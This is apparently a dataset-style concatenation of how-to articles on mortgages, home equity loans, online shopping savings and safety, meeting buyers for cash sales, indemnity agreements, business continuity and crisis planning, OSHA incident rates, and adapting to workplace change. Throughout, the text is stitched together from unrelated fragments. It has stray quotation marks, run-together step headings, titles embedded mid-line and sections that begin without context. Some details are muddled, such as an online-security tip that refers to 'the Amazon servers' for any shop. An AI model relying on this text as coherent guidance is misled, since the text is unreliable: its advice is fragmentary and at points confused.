With a construction-to-permanent loan, however, you have only one closing., Once your home is built, you can shop for a mortgage. You will have to apply and be approved for it. If you got a permanent-to-construction loan, then you’ll need to convert it. Your lender will want to see the following before the conversion takes place:certificate of occupancy from the builder
final title update from a title insurance company
100% complete inspection report
completion and acceptance letter signed by the builder and you
final lien waiver or affidavit signed by your builder
homeowner’s insurance policy with the first year’s premium already paid

Be prepared to pay some fees again.,
Think about adding this person to the deed of the house.,
Consider making a private agreement.,
Talk to a lawyer.",How to Add Someone to Your Mortgage," There’s no harm in asking your bank or mortgage company if you can simply add a person to your mortgage. Be prepared for them to say no, however—in fact, this will be their answer in most cases. Instead, they will likely make you refinance your home, in effect taking out an entirely new mortgage.


Adding a person to your mortgage without refinancing can only work if the mortgage is assumable. Federal Housing Administration (FHA) loans tend to be assumable, but other types may not be.;
, Since you are getting a new mortgage anyway, don’t feel obligated to stay with your lender. Read about how to compare mortgage programs here.

, You will be asked for your full names and Social Security numbers along with the amounts of income you receive and debt you owe. Both of you will also need to submit originals of several documents, including the following:


Pay stubs
Bank statements
Your two most recent tax returns

, Mortgage underwriting usually takes between five and eight business days, but it can potentially take up to a few weeks. If your lender requests more information or documents from you, respond in a timely manner to help the process along., You will now have added this person to your mortgage. Before you do, however, think about your personal situation in relation to the other options that are out there.

, If you are considering adding someone to your mortgage, you probably have some idea of his financial history. A vague idea of his history is not enough here, though. Getting exact numbers where applicable, make sure you know specifics of the following:


Income
Debt, including from student loans
Credit score
Whether he has declared bankruptcy or faced foreclosure in the past seven years

, If you were able to get a mortgage in the first place, it is because your lender believed you had the income to afford the house and a history that made you creditworthy. If you want to add someone to your mortgage, the lender will take both of your incomes, credit scores, etc. into account. While adding a second person’s income can help, other factors can work against this.


For instance, imagine that you have excellent credit (anything above 750). This helped you qualify for favorable terms, including a lower interest rate, on your original mortgage.
Now, imagine that the other person has poor credit—a score of between 600-649.
You might think that the bank or mortgage company will average these two scores together, landing you somewhere in the good to fair range. You could probably still get a decent offer with a score like this.
Unfortunately, this is not what they will do. Instead, they will only consider the lower score.
Not only are you unlikely to receive an offer with favorable terms in this scenario, but you may also not get a mortgage at all.

, Have interest rates fallen dramatically since you got your original loan? Conversely, have they increased? This is one more factor to consider when thinking about refinancing.


Lower interest rates could mean more favorable terms, so many people choose to refinance under these economic conditions.
Higher interest rates could mean less favorable terms, so think carefully before deciding to refinance in this climate.

, Remember all of the closing costs and other fees that you had to pay when you first secured a mortgage? You will need to cover these expenses once again if you decide to refinance.


Closing costs for refinancing can be very expensive—anywhere between three and six percent of the remaining principle on your loan.
This means that, if you have an outstanding balance of $150,000 left on your mortgage, closing costs alone could be between $4,500 and $9,000.
You may be able to get a discount on some fees if you have the original survey and original Owner's Title Policy with you. This only works if there have been no major changes to the property since purchasing.

, If you want your spouse, parent, or child to have a stake in the house (when it comes to inheriting, for instance) but don’t want to go through the hassle of refinancing, consider adding this person to the deed of the house. He won’t be legally liable for the mortgage the same way you are, but he will be one of the owners of the house (once the bank is paid off). Keep in mind that this process can be expensive., There are many reasons, both practical and emotional, why you would want to add someone to your mortgage. But sometimes it’s not necessary. You may find it easier just to have the person who is moving in pay you each month, as a tenant would a landlord, or set up a joint bank account to which each person contributes and is only used for mortgage payments.


This unofficial set-up works best if you are a married couple. If you were to die, your lender would be legally obligated to let your spouse take over the mortgage., It is important to plan for contingencies with someone on your mortgage, but it is even more important without. Nobody wants to think about it, but death, divorce, and other unforeseen events happen. Consider a legally-binding document that answers the following questions:How will costs be divided? You both contribute to the mortgage, but you probably do not make the same amount of money. How much should each person contribute? How will this change if one of you loses your job or goes bankrupt?
What will happen to the house if you break up? Will you sell it, or will one of you stay there? If the former, how will proceeds from the sale be divided? If the latter, who will be responsible for costs?
What will happen if one of you dies? If you are unmarried and/or do not have your spouse or partner’s name on the mortgage or deed, the house may not automatically go to him. If this is what you want, talk to a lawyer to make sure the necessary documents are in place.

Check with your current bank or mortgage company.,
Look around with other banks and lenders.,
Apply for the best interest rate you qualify for.,
Look at the type of interest rate.,
Read lending disclosures carefully.",How to Get a Second Mortgage on Your Home2," If you have a good history of making payments on time, your bank will probably be happy to refinance your home or approve a second mortgage. Since they have already had an insight into your finances, they will also be able to give you good advice. Ask them for some preliminary information and even an estimate before you get too serious about signing any papers.

, As with any financial decision, you want to have options whenever possible. Ask your friends and family who they have gotten loans through before. Search the internet for local banks and lenders to see who approves home equity loans or HELOCs. Get any estimates you could get together and look for the best rates.

, Once you have looked at several financial institutions, you should have an idea which suits your needs the best. Try not to get sucked into a bad rate with unnecessary add-ons. For example, some institutions offer you insurance. This is unnecessary, since you certainly already have house insurance., The 2 basic kinds of interest rates are adjustable (ARM) and fixed rate (FRM). A fixed rate mortgage stays the same from beginning to end. An adjustable rate can fluctuate based on the market, called the index.This may cause your interest rate to go down, but the lender likely has caps on how much it can change.


Knowing which is up to a variety of factors. A simple one is whether you have wiggle room in your budget for interest rate increases. If not, go with an FRM. This will help you create a budget.On the other hand, going with an ARM is a way to avoid having to refinance your mortgage in the future, which has fees associated with it. Instead, your interest rate is constantly being reappraised.
If the bank seems to be trying to sell you on a FRM, however, it may be because the loan index is consistently decreasing. Ask them how interest rates on similar loans have fluctuated in the last couple years.

, Find a loan that does not include penalties if you are late with a payment. One late payment could result in dramatic increases in the loan's interest rate and required monthly payment.

Always try to consolidate your purchases.,
Using online shopping lists with integrated price tracking such as spottster or camelcamelcamel will help you never forget a product or sale again.,
Another solution is a shopping list search engine which finds the lowest seller of all the items in your shopping list (including of course Amazon), but also obscure sellers which often have really low prices.

,
Use sites that will offer you money back in the future such as Ebates.com.,
Check out coupon sites to see if there are coupon codes available for the website you are trying to use.,
Check any Frequent Flyer Programs to see if they allow you to earn miles by shopping online.

,
Try searching for the product you are looking for on comparison sites such as Froogle, and Shopping.com, but beware that they do not check every site and will often show you results that do not actually lead to a product, and do not account for shipping charges, which can vary a lot between websites.

,
You may want to become a member of free shipping sites, such as FreeShipping.com, which offers free shipping from over 1,000 online merchants.,
Try ordering catalogs from Catalogs.com, as they sometimes offer exclusive offers that can be used online, as well as customer ID numbers which allow the companies to identify where you got them from which can yield discounts once in a while.

,
Consider investing in One time fee or low cost membership programs of various websites to see if you can offset the cost of the membership with saving.,
Always check eBay for the product(s) that you are looking for, as you can often find unbelievably good deals on new and mint condition stuff.

,
Think about getting the credit cards of various stores, sports teams, etc, because they often offer rewards for just signing up and even more rewards for spending as little as $25-$50.,
Consider stopping by a local store if an online retailer offers one, for the following reason.,
Keep an eye out for seasonal sales and clearance bargains.",How to Save Money Shopping on the Internet," Make a shopping list then use a search engine that lets you search your entire list for the lowest total price for the entire list. Amazon offers the ability to consolidate purchases at their site, but often the purchases come from different sellers so you actually don't save on shipping charges after all.;
, You simply save products and relax - they will notify you if the price drops or vouchers pop up. Camelcamelcamel is exclusively for Amazon, spottster tracks the prices of 3’000+ shops and is both a browser add on and an app (Android and Apple)

,, This site lets you sign up for free and save between 1% and 25% on many different online merchants (the average saving is 2%-4%).

, Unfortunately, many of the ""offers"" on these sites are just ads for various sales and specials that lead you to a website rather than actually provide a code to save you money.

,,, It also allows you to get complete price protection within 90 days and Double Warranty on anything you buy. After the trial, it costs $5.99 per month, billed annually. Deals such as this can save you money long term if planned properly.

,, A good example of this is the BN Membership program, which for $25 bucks per year, gets you a 10% discount. This is great for avid book reader or movie watchers (since they offer DVDs at great prices) or student who need lots of textbooks.

,, Of course, you can cancel if you don't want the extra bills and you can't use or don't want whatever long-term saving it may offer.

, If you want something that is not in stock in the store, you can often order it from their website with free shipping. Sears goes even further as to allow customers to order anything from the website with no shipping charges.

, Even changes within the season allows online merchants to provide clearance and sale offers. Make use of sales, clearances and save a great amount of money.

Do a web search for your item.,
Look for your product on Amazon.,
Check auction sites.,
Visit market-specific sites.,
Look at deal aggregation sites.,
Trust your gut.,
Note the shipping costs.,
Buy multiple items to minimize shipping.,
Avoid refurbished items if possible.,
Read the return policy.,
Search for coupon codes.,
Check the site's security.,
Use a credit card instead of a debit card.,
Never make a purchase on an unsecured wireless network.,
Vary your passwords.,
Archive your receipts.,
Shop using a virus-free system.",How to Shop Online," One of the most effective ways to quickly find sites that are selling the product you want is to simply search for the product using a search engine like Google, Yahoo!, or Bing. If the product is popular, you will receive several pages of links to shops that offer it. You can use this as a starting point for comparing prices.;
, Beyond selling products themselves, Amazon acts as a liaison between you and a massive number of third-party vendors. The companies and people all use Amazon as a way to list products and use the Amazon payment system. This means Amazon and its third-party vendors has one of the largest inventories available on the planet


Amazon allows for vendors to sell used goods, so be aware of the product you are buying if you need it new.

, For harder to find items, check online auction sites. These are a little more hands-on than simply purchasing from a store, but you can potentially find good deals and rare items if you take the time. See this guide for tips on auction sites.


Auction sites have a lot more rules and regulations than traditional stores, and require a fair amount of input from you, the buyer. Make sure that you are familiar with all of the rules and regulations before you begin bidding.

, Beyond the big-name stores and auction sites, there are also a variety of marketplaces that cater to specific markets. You may be able to find better deals for what you need, or bulk options that weren't available in the big stores.


Don't forget to check the product manufacturer's site as well. You may be able to save some money buying direct from the manufacturer instead of through a retailer. Not all manufacturers have their own online stores.
There are a variety of sites that will collect prices from a wide selection of online stores and return a comparison.

, A lot of forums and sites exist for finding deals on specific items. These sites are mostly geared for specific markets, such as deals on electronics, books, and more. If you aren't looking for specific items but want to stay informed about the latest deals on products that interest you, these are great services.

, If you start to feel pressured into a purchase or you feel that the deal may be too good to be true, trust your instincts and avoid the sale. There are plenty of people who offer get-rich-quick schemes and ""life-changing"" products, but these should all be met with a hefty dose of skepticism.


Always read reviews of the seller and the product before making any purchases.

, Even if you find an amazing deal on an item, it might be offset by what you have to pay to ship it. If the shipping costs are outrageous, ask yourself if it's worth paying to ship as opposed to getting it from the store downtown.


Compare the costs of different shipping methods. If you don't need it immediately, you could save yourself a lot of money by picking a slower shipping method.
Be especially wary of shipping costs from auction sites. These are set at the discretion of the seller, and unscrupulous senders may hike up shipping to take advantage of customers.

, If you are purchasing multiple items, try to do so all from the same vendor, and in one purchase. Most vendors will group these into one shipment and many will ship for free over a certain purchase amount.

, Refurbished items are often sold for close to the amount of a new one, but have been repaired to be resold. While you may be able to find good deals this way, avoid it if possible. If you are going to be buying refurbished, check the warranty and ensure that the coverage is good in case it fails again.

, One of the biggest differences between buying from a brick-and-mortar store and an online retailer is dealing with returns. Make sure that the retailer you are buying from has a comprehensive return policy, and that you understand what you will be responsible for.


Many retailers charge restocking fees to process returns. This may be taken out of the amount returned to you.

, Many retailers will have a field where you can enter promotional codes. These may be store-wide discounts or special deals on specific products. Before you make you purchase, do a web search for coupon codes for that retailer and input any that you find that are relevant to your purchase.

, Any site that you make a purchase on should have a padlock icon next to the address when you are in the checkout process. This ensures that your information is encrypted as it is transferred to the Amazon servers, which prevents thieves from being able to read the data. If you don't see the padlock icon, do not purchase from that website.


Secure sites will also have ""https://www.example.com"" instead of ""http://www.example.com""

, You will have much more security if your account is compromised if you pay with a credit card instead of a debit card. This is because if your debit card information is stolen, the thieves have direct access to your bank account, whereas if the credit card information is stolen, it can all be quickly reversed by the credit card company.Try to use one credit card for all online purchases to help minimize the risk and keep any potential incidents isolated.

, If you are connected to an unsecured wireless network, any data that you send out from your device is unencrypted until it reaches the router. This means that hackers can ""listen in"" on your device and the information you are sending and receiving from the internet.


If you had to enter a password to join the network, then it is secure and your data is being encrypted. For the most security, only make purchase from a computer on you home network.

, As you shop more online, you will inevitably be creating multiple accounts to use at various retailers. Always ensure that your passwords are different for each store, regardless of inconvenience, because if one store is compromised the thieves would have access to your payment information any store you use.

, Keep a record of all of your purchases so that you can compare your receipts to your bank statement. It will also help to have receipts for legitimate purchases in the event of fraud.


You can either print and file your receipts or save them digitally.

, Viruses on your computer can jeopardize your security and send your information to hackers and thieves. To prevent this, make sure that you keep your anti-virus program up to date and perform regular virus scans. See this guide for details on keeping your computer protected against viruses and malware."

Sign up to retailers electronic newsletters.,
Watch social media profiles.By liking your favourite brand’s Facebook page or following their Instagram or Twitter accounts, you’ll have a good chance of hearing about their discounts or upcoming sales first.,

Enter competitions.",How to Save Money Shopping Online in Australia," Most big brand retailers have daily,weekly or monthly electronic newsletters that you can sign up to receive information on their promotional offers. Very often by signing up to either their newsletter or simply creating a free account with them you may receive a welcome coupon code giving you an instant discount. Examples include SurfStitch ($20 off orders over $100), The Iconic ($10 off orders over $50), Get Wines Direct ($10, no minimum spend), EziBuy ($20 off, which you’ll receive in the catalogue which they send you) as well as Amazon UK ($20 off when you sign up to their fashion newsletter).;
, This is down to the fact that most retailers choose to make these sorts of announcements via social media. Often, you may also find that certain discounts aren’t advertised anywhere else, particularly when it comes to flash sales.

, Never shop without a voucher or coupon code as they’re easily accessible online these days, giving customers not only discounts on prices but free shipping in many cases as well. Always search Google and dedicated coupon sites for coupon codes at whichever store you plan on making a purchase from. If you’re not a regular coupon user, you’ll probably be surprised at how often you’re likely to find an active code giving you an instant discount.

, There are a number of extremely useful web browser plug-ins available that make hunting for the lowest product prices online a breeze. Most only take a few clicks to install. Not only will they find the cheapest prices of the product you’re looking at, but they’ll also notify you of any active coupons available for that particular retailer.

, With online shopping booming in Australia during recent years, a number of international retailers have taken note of this started shipping their products to Australia. The relatively high shipping fees that the average online retailer in Australia still charges is what, in many cases, makes it worth while shopping on overseas websites. Whenever there’s a lull in general sales or discounts locally, you now have the advantage of seeking out strong promotions from international retailers like Black Friday and Cyber Monday sales in the USA who may be discounting the exact product you’ve had your eye on. Popular categories of products that savvy shoppers use this tactic on often include games, electronics, and fashion.

, Shopping online is generally very convenient and cost effective, but when you receive something you don’t really want, that’s when things start to become costly. To return an item in person is often only feasible with large chains who have numerous stores nationwide. Thus if you're forced to return something online, it generally means you’ll have to pay for return postage which in most cases can be expensive. If you're looking to buy an item you want no matter what, you can afford the risk. However, if you aren't 100% certain make sure that you read the returns policy for that retailer so that you don't get caught out in this way. You'll also want to keep an eye out for retailers who offer free returns within a certain period.

, The old saying “You’ve got to be in it to win it” rings true in this instance. The motivation for retailers behind running competitions is to reward dedicated fans and followers as well as attract new customers by giving away free items or discounts. With such a vast array of options out there, the rule of thumb should be that if it only takes you a very short period of time to enter, well then it’s worth a shot. The people who enter competitions on a regular basis could end up winning something at least a handful of times a year – and sometimes that “something” can be pretty substantial.

, If the price you negotiate is too good to be true, it very likely is. And it may be a way to get you to come to a crook with cash in order to rob you; most people will not take as many precautions for smaller amounts of money.

, Giving your name and phone number are fine, but avoid giving your address or work place.

, A fast food place, Starbucks, and the phone store that the phone is branded such as Sprint, or AT&T are all acceptable places. Never, even if someone gives an excuse, go to someone's home or work address, especially alone.


If someone gives you excuses as to why you need to go to their apartment or home, do not agree under any circumstance. They may tell you their children are home, they are too young to drive, that their car is broken down, or a number of other creative excuses, still, do not accept the excuse, you have no way of knowing if it's true. Very good thieves and manipulators know exactly what to say so that you let your guard down and agree to something unsafe.

, Preferably during the day, and have a friend or family member come with you. Make sure if you are buying jewelry or an expensive item that you try to always bring a companion. Thieves count on you being alone.

, If there is an emergency you want a quick way to get in touch with help.

, You do not want the person you're meeting to follow you or be with you when you go to the bank or ATM, it could be dangerous. There is a possibility they could also be working with another person who follows you while the first person waits at the location where you've initially met.

, It sounds like this is a lot of work, but it is worth it to stay safe.

why you want to dispute the transaction
any other details

Sign the agreement.",How to Draft an Indemnity Agreement," You may be able to find a sample online that you can use as a guide for your own indemnity agreement. Many legal service companies also offer forms or templates to create an indemnity agreement, although you typically must pay a fee to access them.Samples used by other companies also may help you decide how to word your clauses, or give you an idea of what kind of information you need to include.
Make sure any agreements you look at deal with situations similar to yours. Indemnity agreements are used for many different purposes, and one written for one reason may not work for another.
If you think you're in over your head, you might consider consulting an attorney to draft your agreement for you. An experienced transactional attorney typically will draft an indemnity agreement for you for a relatively low flat fee.;
, Before you sit down to draft your agreement, you need to have sufficient information regarding the activity to take place and the possible claims that could arise as a result of that activity.The purpose of your agreement is to have the other person indemnify you against those risks or losses, thus transferring the risk from you to them.
A strong agreement should include a detailed description of those risks, so the other person understands the liability they are assuming.

, Start out your indemnity agreement by listing the parties to the agreement by name, including legal business names where applicable and the address of each party's residence or primary place of business.In some situations, you can identify the person who will be indemnifying you by using the pronoun ""I."" This typically occurs when only one person is signing the agreement, and the activity isn't reciprocal in nature.
Those types of indemnity agreements typically are drafted with the idea that many different people will sign a copy of the agreement before the activity takes place.
These more generic, first-person agreements often are used by businesses that invite the public to take part in relatively high-risk activities, such as bungee jumping, and typically also include a release of liability.
In situations where you're drafting the indemnity agreement to correspond to another contract or shared undertaking, identify both parties by name and write the agreement in third person, rather than using first- or second-person pronouns such as ""I"" and ""you.""

, Before you get to the heart of the agreement, write a few paragraphs that describe the reasons the parties are entering the agreement and any background that is necessary to understand the risks involved.In legal circles, these often are known as ""whereas"" clauses because each clause typically begins with that word. However, that legal jargon typically isn't necessary in an indemnity agreement.
These clauses are added to put the indemnity agreement into context and explain the motivations of the parties.
Since they typically aren't considered legally operable or binding, these clauses should only include background information or statements – not anything relating specifically to indemnification.
If there are particular risks involved in participating in the activity, this is where you might list those. Whether, and to what extent, particular risks must be listed specifically depends on the laws of your state.

, Since each state has laws that may restrict the situations in which indemnity agreements can be used, or the terms that may be included, you should have a thorough understanding of your state's law to ensure your indemnity agreement will be enforceable.The law that applies and governs the agreement typically will be the law of the state where the activity or project will be taking place – since that's the law that would govern any lawsuit that arose as the result of an injury or loss.
In addition to state law, there also may be federal law that applies depending on the activity involved or the industry in which you operate.
Keep in mind that if you include a clause that is prohibited in your state, a court will consider it void. In some cases, this could result in the whole agreement being legally unenforceable.
In contrast, if you've neglected to include something state law requires, the court typically will read it in as though it were there. This may have the effect of negating other clauses or limiting their operation.
This is another situation in which you may want to consider consulting an attorney if you feel like you're getting too far into the weeds and don't understand exactly what must be included or how the law applies to your situation.

, If you are the party indemnifying the other, you want the scope of that indemnity to be as narrow as possible. However, if you're the party being indemnified, you'll want that scope to be as broad as possible. A strong indemnity agreement is a compromise between these two positions that respects them both.This is another area in which state law can come into play. you can only have another party indemnify you against so much. For example, someone typically can't indemnify you against injuries or losses that occur as a result of the intentional or criminal action of a third party.
When someone indemnifies someone else, they essentially are saying that they will take responsibility for those injuries or losses. However, those injuries or losses may come about as a result of the actions of someone else.
The scope of the indemnity should not extend beyond the person signing the agreement, or people acting on their behalf and who are under their control, such as employees.
Particularly in the construction industry, address the responsibility of contractors and subcontractors. While it isn't uncommon for contractors to be required to indemnify the builder or property owner against actions or negligence on the part of subcontractors, this should be evaluated on a case-by-case basis.
If the person signing the agreement has no factual control over the actions of someone else, they typically shouldn't be required to take responsibility for those actions.
On the other hand, making the contractor responsible for actions of subcontractors can encourage the contractor to engage in more oversight on the project as a whole.

, Depending on the scope you've defined, there may only be specific instances in which the other party will be called upon to defend or indemnify you.Keep in mind that the obligation to defend is separate from the obligation to indemnify, and has its own legal requirements.
There may be situations in which the person is required to indemnify you, but you have to put up your own defense. In these situations, the person indemnifying you typically can't be held responsible for the costs of your defense.
In some cases, a lawsuit must be tried and concluded before indemnity can be established.

, In industries as varied as construction and film production, requiring the indemnifying party to purchase liability insurance that covers negligence up to a certain specified amount is standard.Typically referred to as ""errors and omissions"" insurance, the policy covers the indemnifying party in the event of their own negligence.
Since most individuals and small businesses don't actually have the money to cover a lawsuit if one is filed, or to cover in full any losses or injuries that occur, liability insurance guarantees that they will be able to fulfill their duties under the indemnity agreement.

, Particularly if you're dealing with an independent contractor or if you've required the purchase of liability insurance, including a maximum amount of damages for which the indemnifying party is liable is reasonable and prudent.Stating a cap up front also provides the indemnifying party with the maximum amount for which they'll be liable, so they can budget and plan accordingly.
You also may want to include different caps for different situations. Keep in mind that the purpose of an indemnity agreement is to transfer or redistribute the risk of getting involved in a particular activity.
A contributory negligence clause can handle situations in which both you and the indemnifying party were negligent to some degree.

, In some situations, you must disclose the particular risks for which the indemnifying party is taking responsibility. These disclosures ensure both parties are equally informed as to the risks of their endeavor.Typically these disclosures are necessary when the indemnifying party is voluntarily engaging in some high-risk activity, such as bungee jumping or sky diving, and you are providing them with the means to do so.
The purpose of these disclosures, many of which are required by state law, is to ensure the indemnifying party is aware of the risks before pursuing the activity.
By signing the agreement, the indemnifying party acknowledges that they are aware of the specific risks you've disclosed.
For this reason, you also should consider disclosing risks that the other party might not consider, even if they have a relatively rare chance of occurring.

, Longer, more complicated agreements typically include a list of miscellaneous provisions – known as ""boilerplate"" in legal jargon – that make various contractual statements the law requires for a contract to be legally valid.Since these provisions typically are included in almost any contract, it should be relatively easy for you to find the applicable language that you need.
Common miscellaneous provisions deal with where problems with the agreement should be resolved, including any requirement that the parties participate in alternate dispute resolution (ADR). ADR involves settling disputes through mediation or arbitration rather than through the courts.
You also want to include a provision that identifies which state's law governs your indemnity agreement.

, Before you ask the other party to sign an indemnity agreement, make sure they have the opportunity to read and research the situation thoroughly, as well as consult an attorney if they want.Avoid pressuring the other party to sign the agreement during this time. You can remind them of any deadlines, but be careful about your language and keep in mind that if a contract is signed under duress, it is not enforceable in a court of law.

, Your indemnity agreement typically must be signed by both you and the other party to be legally valid and enforceable. In some situations, you may want to have the signing take place in front of a notary public.You typically can find a notary public at the courthouse. Most banks also offer notary services free to their customers.
Depending on how you've structured your agreement, it may only require the signature of the party who is indemnifying the other.
However, if the indemnity agreement is mutual, or was created in conjunction with another agreement or contract that was signed by both parties, both parties also should sign the indemnity agreement.
Once the agreement is signed, make at least two copies – one for yourself and one for the other party – and keep the original in a safe place along with any other agreements or contracts related to the same transaction or project.

Accept the potential threats and risks facing your company.,
Don’t confuse business continuity plans with disaster recovery plans.,
Consider the potential threats/risks facing the company.",How to Create a Business Continuity Plan1," The possibility of a disruption shutting down your business operations is scary to think about, but you should always be prepared and willing to accept that risks and threats can cause turmoil for your business. Once you can accept that unplanned for risks and threats can have devastating results on business operations, you can then make a plan that ensures that both your business’s assets and personnel are sufficiently protected.Make a list of possible risks and their impact upon your company. For example, the death of a key person will not typically result in closing the doors for a while, but can severely impact results, vendor relations and customer service.
After identifying risks, sort them by impact and livelihood to prioritize your planning.;
, Business Continuity Plans are sometimes referred to as Disaster Recovery Plans and the two have much in common. Disaster Recovery Plans should be oriented towards business recovery following a disaster, and mitigating the negative consequences of a disaster. In contrast, Business Continuity Plans focus on creating a plan of action that focuses on preventing the negative consequences of a disaster from occurring at all., Business impact analysis plans consider the potential consequences to your business when the ability to function and process has been disrupted by a threat or risk. As a result, creating a BIA allows you to determine which issues, risks and threats that your business continuity plan needs to address. You should consider the possible effects a disruption to business operations could cause, such as:Lost income and sales
Increased expenses
Customer defection/dissatisfaction
Tardiness in service delivery
Regulatory fines
Delay/inability to commence future business plans.

You may be in charge of a project until your supervisor comes back and are unable to contact him during a crisis. You have to make your own decisions in his absence and your action is dependent on the level of authority given.;
, It is not easy to handle a crisis if you are not aware of the all the facts. The final outcome may not be the way you envisage. If your role is a leader, you have to be detached from the emotional side of the crisis and rationally take stock of how to move on. Again, this is not as easy as it sounds as you may have longtime colleagues who are involved in this crisis.

, It is important to be able to meet up with the relevant team to discuss about the situation. This is to ensure that the team is able to analyse and make a united stand about handling this crisis. This team should also comprise of the authorities, if the crisis is serious.

, You must construct a timeline and ensure that each process scenario is highlighted. This practice will be a check to prevent your team from spending too much time in one aspect of handling the crisis.

, Is there an organizational situational manual that you can use for this situation? Are you able to recollect the tips that were given to you when you participated in a mock drill?

, You should get external experts to access the situation if the crisis is totally unanticipated. However, you must have had a close-door meeting with your inner circle. This is essential, as you do not want to unnecessarily reveal confidential information to external parties.

, It is important to prepare a press kit which provides a full detailed report about the crisis. If you are comfortable to conduct a press interview, you have to ensure that you have the full details first.

, You have to ensure that your communication style is in sync with the crisis. Remember to be forthcoming with reliable information and try not to speculate. This will also ensure that the victims' immediate families do not overly worry. It will also not help if you come across as very emotional in the media as you want to communicate that your organization has everything under control.

, If the crisis involves the loss of lives, it is not unthinkable that your credibility and organisation's reputation is put into question. Assuming that the crisis was beyond your organisation's control, you have to stick to your best judgement and not be led into a debate that may open your organisation to possible legal action.

Before you can determine whether or not you need to report incidents to OSHA, you need to understand what industry you're part of.


Industries are usually defined by broad categories like ""Construction,"" ""IT Services,"" ""Food Service,"" etc.
Pick a keyword or two that best describes your business. You'll need that for the next step.

, The NAICS is the North American Industry Classification.It's a 6-digit code that's used to classify a business. The federal government uses the code to maintain statistics about the types of businesses that exist in the United States.


Visit the NAICS search site.Enter a keyword that describes your business in the field in the upper, right-hand corner of the screen, just above the button that reads ""2007 NAICS Search"". OSHA still classifies industries based on the older NAICS codes, so you'll need to use that search instead of the newer, 2012 search.Click the ""2007 NAICS Search"" button.
The new page that appears will be a list of NAICS codes and businesses. Select the NAICS code that best describes your business.
For example, if your business is a restaurant and you put ""restaurant"" in the search field, you'll see a variety of codes with descriptions that include the word ""restaurant."" However, the code 722110 is used to classify full service restaurants., Visit OSHA's website to get the list of exempt types of business based on the NAICS.For this step, you'll only need the first four digits of your NAICS. For example, if your NAICS is 722110, you only need the 7221 portion of the code.


The OSHA website lists exempt industries by NAICS, sorted in ascending numerical order. Just scroll down until you see where your industry code would be located. If it's there, then your business is exempt. In this case, you can see that 7221 is listed and therefore full-service restaurants do not need to report incidents to OSHA.Keep in mind, you will still need to report incidents to OSHA if you're requested to do so by OSHA, the Bureau of Labor Statistics, or any other government organization operating under the authority of OSHA.

, The formula for calculating incidents is the number of recorded accidents in that year multiplied by 200,000 (to standardize the accident rate for 100 employees) and then divided by the number of employee labor hours worked. So the formula, again, is accident rate=(number of accidents*200,000)/number of hours worked.

The 200,000 in this formula represents how many hours would be worked by 100 employees, each putting in 40 hours per week over 50 weeks in a year; OSHA requires the accident rate to be expressed as incidents per 100 employees with maximum straight-time hours.

, The OSHA 300 log is what you use to record workplace injuries.In that log is a table where you record incidents. Simply count the number of lines that you've filled out in that table to determine the number of recordable incidents.


Remember, the rate is calculated on an annual basis for OSHA compliance. So, you'll be reviewing data from the previous year to get the rate.

, You'll need to pull some payroll data for this step. For example, if you have 20 employees and they each worked 2,000 hours during the year, then the total number of hours worked is 20 x 2,000 or 40,000.


The total number of hours will include overtime hours, but does not include vacation, paid sick leave or holiday pay.

, For example, if you recorded 2 incidents, then the number is 2*200,000 or 400,000.

, Take the number from Step 3 and divide it by the number from Step 2.


For example, if you had 1 recordable incident out of 10,000 hours worked in a year. Your calculation would be 1*200,000 / 10,000.

, Many businesses like to track the incident rate as a monthly figure to assist them in meeting annual and quarterly goals.


Adjust your calculation for each month to reflect the hours worked by all employees for only that month.
Add the incidents and hours worked from each month and then calculate the incident rate on the totals.
For instance, if you had 1 January incident over 10,000 hours worked, then your January average incident rate would be (1*200,000)/10,000, or 20.
For another example, if you had eight accidents over 400,000 hours worked by employees in a year, you would calculate the accident rate as (8*200,000)/400,000, or 4.

Assess your current mindset about the change.,
Accept that change is inevitable in business.,
Reflect on how you’ve handled past changes.,
Take responsibility for your response to change.,
Adopt a positive attitude.,
Hold yourself accountable for adapting to the new change.",How to Adapt to Changes in a Business Environment1," At the beginning of this process, you will need to fully understand your current thoughts about the change. You may be excited, hesitant, angry, fearful, anxious, or ambivalent to the change. You may have multiple feelings or conflicting thoughts about the change and are unsure how you will react when the change is implemented. Take a few hours to think about the change that is being instituted and write down your thoughts.For instance, management might be instituting a new policy about overtime pay. Think about how this will affect you. Do you work overtime frequently? Do you rely on the additional money or is it an incentive for you to work longer hours? Or, the new policy may not affect you at all.
Many people find it helpful to write their thoughts down as they reflect.;
, Change is bound to happen, especially if you work in a field that is quickly growing and adapting, like technology. You may love how your business environment is at this moment, and a change may feel like a blow to your confidence. However, you should frame the way you think about this change as an opportunity to better your career and to implement new procedures into your day to day work.There will be technologies and procedures that become outdated and are no longer relevant to the workplace. You might have to learn how to use a new type of computer or software program because the old one has become outdated.

, You have responded to changes in the past, even if they weren’t in your current workplace or career. Think about what that change was, and how you reacted to it. For example, you may have had to change offices with a coworker that you dislike. Did you get upset about the change and complain to management? Or did you discuss the change with your manager and work out a solution? Thinking about how you’ve responded to change in the past will help you to anticipate how you will react to this current change.


It may be helpful to talk to someone who is close to you, like a spouse or best friend, and ask them about how you handle change. This can provide valuable insights as you begin to approach this new challenge.

, Whether you have reacted poorly or positively to change in the past, you will have to take responsibility for your response. Understandably, some changes are much more difficult to cope with than others. Some have profound impacts on the way that we live our lives, and they can present other unanticipated challenges. However, you are able to control your emotional reaction to change.Think about whether there was a trigger for your response. You could ask yourself whether you resisted a small change at work because you were stressed about your home life, or whether when you became angry about a new policy there was something else bothering you. Understanding these triggers can help you take ownership of your responses to change.

, Your attitude and mindset will frame how you respond to the change and whether you are able to adapt to it within your workplace.Think about how you have responded to changes in the past and realize that a positive attitude can improve your future responses.At this stage, the change may or may not have been implemented into the business environment. If it has not already been implemented, this is your time to approach the change in a positive way. If it has already become a new policy or mandate, your positive attitude will reflect itself in how you incorporate the change into your work habits.


For instance, your workplace may now require different sets of forms to be completed as a part of new regulations. Rather than thinking of these forms as a waste of your time, or something that you should dread doing, reframe your thoughts. Consider these new forms as a way to document your workplace productivity, and that they will allow management to effectively oversee business operations.

, Whether the change has already gone into effect, or if it is still in the future, you can hold yourself responsible for how you will respond to it.It is helpful to think of this accountability in relation to time. The change may be deep, and will significantly change your workplace, or it may be a smaller change that will have less of an impact.


Think about and write down what you want your response to be towards the change. You should include how long it will take you to adapt fully to the change. For example, a major policy change may take a few weeks to fully implement. You should give yourself time to adapt to the policy, but hold yourself accountability to following through on your goal."

Make a list of key internal personnel.,
Document critical business equipment.,
Identify critical documents.,
